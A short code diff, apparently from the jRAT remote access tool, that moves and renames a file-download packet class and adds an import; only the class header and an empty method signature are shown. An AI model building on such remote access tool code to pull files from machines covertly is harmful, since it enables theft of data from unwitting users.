@@ -1,14 +1,15 @@
-package jrat.client.packets.incoming;
+package jrat.module.fs.packets.download;
 
 import jrat.client.Connection;
 import jrat.client.packets.Temp;
+import jrat.client.packets.incoming.IncomingPacket;
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
 
 import java.io.File;
 
 
-public class Packet42ClientDownloadFile implements IncomingPacket {
+public class Packet42Download implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
